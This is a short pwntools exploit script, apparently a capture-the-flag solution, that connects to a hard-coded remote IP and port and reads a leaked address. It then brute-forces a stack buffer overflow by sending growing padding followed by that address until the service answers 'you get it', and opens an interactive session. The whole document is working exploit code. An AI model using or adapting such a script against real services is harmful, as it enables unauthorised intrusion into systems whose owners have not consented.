from pwn import *

context(os="linux", arch="amd64", log_level="debug")

padding = 0x80
finalRecv = ""
while True:
    # io = process("./pwn")
    io = remote("47.79.89.88", 33083)

    io.sendlineafter(b"= ", b"a" * 4)
    io.recvuntil(b"0x")
    addr = int(io.recvline()[:-1], 16)

    payload = b"b" * padding + p64(addr)
    io.sendline(payload)

    try:
        finalRecv = io.recv()
        if b"you get it" in finalRecv:
            io.interactive()
            break
        else:
            io.close()
    except:
        io.close()

    finally:
        padding += 1
